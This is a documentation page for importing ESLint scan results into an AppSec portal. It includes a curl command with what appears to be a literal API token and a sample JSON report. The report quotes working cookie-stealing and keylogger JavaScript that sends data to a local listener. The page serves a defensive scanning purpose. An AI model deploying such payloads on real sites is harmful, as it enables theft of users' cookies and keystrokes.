---
description: >-
  ESLint is a popular open-source static analysis tool that is used to find and
  fix problems in JavaScript code.
---

# ESLint

**Auditor Job Name**: ESLint Scan\
**Auditor image:** registry.gitlab.com/whitespots-public/security-images/eslint:8.42.0\
**AppSec Portal Importer Name**: ESLint Scan, GitLab ESLint

[ESLint scaner](https://github.com/eslint/eslint) and [ESLint scaner(GitLab) ](https://gitlab.com/gitlab-org/security-products/analyzers/eslint)checks code for **common errors** and **coding style issues**, ensuring that the code is consistent and maintainable.

ESLint can detect a wide variety of issues, from simple syntax errors to more complex issues like **security vulnerabilities**. It supports a range of configurations that can be customized to suit your specific needs.

#### Curl example

{% code overflow="wrap" %}
```
curl -X POST localhost/api/v1/scan/import/ -H "Authorization: Token a75bb26171cf391671e67b128bfc8ae1c779ff7b" -H "Content-Type: multipart/form-data" -F "file=@./eslint.json" -F "product_name=Product1" -F "product_type=Application" -F "scanner_name=ESLint Scan" -F "branch=dev" -F "repository=git@gitlab.com:whitespots-public/appsec-portal.git"
```
{% endcode %}

In this command, the following parameters are used:

1. `-X POST`: specifies the HTTP method to be used (in this case, POST)
2. `-H "Authorization: Token <authorization_token>"`: specifies the [**authorization token**](../../importing-reports-from-scanners-to-appsec-portal/#authorization-token) obtained from AppSec Portal.
3. `-H "Content-Type: multipart/form-data"`: specifies the content type of the request.
4. `-F "file=@<report_file_path>"`: specifies the **path to the report file** generated by the scanner.
5. `-F "product_name=<product_name>"`: specifies the **name of the product** being scanned.
6. `-F "product_type=<product_type>"`: specifies the **type of the product** being scanned.
7. `-F "scanner_name=<scanner_name>"`: specifies the **name of the scanner** used to generate the report (ESLint Scan or GitLab ESLint)
8. `-F "branch=<branch_name>"`: (_optional_) specifies the name of the branch in the source code repository (if applicable) This parameter is particularly useful when you want to associate the scan results with a specific branch in your repository. If not provided, the scan will be associated with the default branch

Asset information, if an [auditor ](broken-reference)is used

9. `-F "repository=<repository SSH URL>"`: If your product is **code** in a repository enter the address of your **repository** in a specific format, for example: git@gitlab.com:whitespots-public/appsec-portal.git
10. &#x20;`-F "docker_image=<registry address>"`: If your product is **image** enter the address of the **registry** where your product is located, for example: registry.gitlab.com/whitespots-public/appsec-portal/back/auto\_validator:latest
11. `-F "domain=<domain>"`: If your product is **web** enter the **domain name** of your product, for example: whitespots.io
12. `-F "host=<host>"`: If your product is **web** enter the **IP address** of your product, for example: 0.0.0.0

**Report example:**

```json
[{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/bad/payloads/cookie.js",
"messages":[{"ruleId":"scanjs-rules/assign_to_src",
"severity":1,"message":"Assignment to src can be unsafe",
"line":1,"column":1,"nodeType":"AssignmentExpression",
"endLine":1,"endColumn":68}],"suppressedMessages":[],
"errorCount":0,"fatalErrorCount":0,"warningCount":1,
"fixableErrorCount":0,"fixableWarningCount":0,"source":
"new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;\n",
"usedDeprecatedRules":[]},
{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/bad/payloads/keylogger.js",
"messages":[{"ruleId":"scanjs-rules/call_setInterval","severity":1,
"message":"The function setInterval can be unsafe","line":10,"column":1,
"nodeType":"CallExpression","endLine":14,"endColumn":9},
{"ruleId":"scanjs-rules/assign_to_src","severity":1,
"message":"Assignment to src can be unsafe","line":12,"column":3,
"nodeType":"AssignmentExpression","endLine":12,"endColumn":57}],
"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,
"fixableErrorCount":0,"fixableWarningCount":0,
"source":"console.log(\"ACTIVANDO EL KEYLOGGER...\");\nvar keys='';\ndocument.onkeypress = function(e) {\n  get = window.event?event:e;\n  key = get.keyCode?get.keyCode:get.charCode;\n  key = String.fromCharCode(key);\n  keys+=key;\n}\n\nsetInterval(function(){\n  console.log(\"Loop\");\n  new Image().src = 'http://127.0.0.1:8000/keys?c='+keys;\n  keys = '';\n}, 8000);\n",
"usedDeprecatedRules":[]},
{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/bad/payloads/payload.js",
"messages":[{"ruleId":"scanjs-rules/call_setInterval","severity":1,
"message":"The function setInterval can be unsafe","line":10,"column":1,
"nodeType":"CallExpression","endLine":14,"endColumn":9},
{"ruleId":"scanjs-rules/assign_to_src","severity":1,
"message":"Assignment to src can be unsafe","line":12,"column":3,
"nodeType":"AssignmentExpression","endLine":12,"endColumn":57}],
"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,
"fixableErrorCount":0,"fixableWarningCount":0,
"source":"console.log(\"ACTIVANDO EL KEYLOGGER...\");\nvar keys='';\ndocument.onkeypress = function(e) {\n  get = window.event?event:e;\n  key = get.keyCode?get.keyCode:get.charCode;\n  key = String.fromCharCode(key);\n  keys+=key;\n}\n\nsetInterval(function(){\n  console.log(\"Loop\");\n  new Image().src = 'http://127.0.0.1:8000/keys?c='+keys;\n  keys = '';\n}, 8000);\n",
"usedDeprecatedRules":[]},
{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/good/payloads/cookie.js",
"messages":[{"ruleId":"scanjs-rules/assign_to_src","severity":1,
"message":"Assignment to src can be unsafe","line":1,"column":1,
"nodeType":"AssignmentExpression","endLine":1,"endColumn":68}],
"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":1,"
fixableErrorCount":0,"fixableWarningCount":0,
"source":"new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;\n","usedDeprecatedRules":[]},{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/good/payloads/keylogger.js","messages":[{"ruleId":"scanjs-rules/call_setInterval","severity":1,"message":"The function setInterval can be unsafe","line":10,"column":1,"nodeType":"CallExpression","endLine":14,"endColumn":9},{"ruleId":"scanjs-rules/assign_to_src","severity":1,"message":"Assignment to src can be unsafe","line":12,"column":3,"nodeType":"AssignmentExpression","endLine":12,"endColumn":57}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,"fixableErrorCount":0,"fixableWarningCount":0,"source":"console.log(\"ACTIVANDO EL KEYLOGGER...\");\nvar keys='';\ndocument.onkeypress = function(e) {\n  get = window.event?event:e;\n  key = get.keyCode?get.keyCode:get.charCode;\n  key = String.fromCharCode(key);\n  keys+=key;\n}\n\nsetInterval(function(){\n  console.log(\"Loop\");\n  new Image().src = 'http://127.0.0.1:8000/keys?c='+keys;\n  keys = '';\n}, 8000);\n","usedDeprecatedRules":[]},{"filePath":"/builds/whitespots-public/vulnerable-apps/python-public-example/good/payloads/payload.js","messages":[{"ruleId":"scanjs-rules/call_setInterval","severity":1,"message":"The function setInterval can be unsafe","line":10,"column":1,"nodeType":"CallExpression","endLine":14,"endColumn":9},{"ruleId":"scanjs-rules/assign_to_src","severity":1,"message":"Assignment to src can be unsafe","line":12,"column":3,"nodeType":"AssignmentExpression","endLine":12,"endColumn":57}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,"fixableErrorCount":0,"fixableWarningCount":0,"source":"console.log(\"ACTIVANDO EL KEYLOGGER...\");\nvar keys='';\ndocument.onkeypress = function(e) {\n  get = window.event?event:e;\n  key = get.keyCode?get.keyCode:get.charCode;\n  key = String.fromCharCode(key);\n  keys+=key;\n}\n\nsetInterval(function(){\n  console.log(\"Loop\");\n  new Image().src = 'http://127.0.0.1:8000/keys?c='+keys;\n  keys = '';\n}, 8000);\n","usedDeprecatedRules":[]}]
```
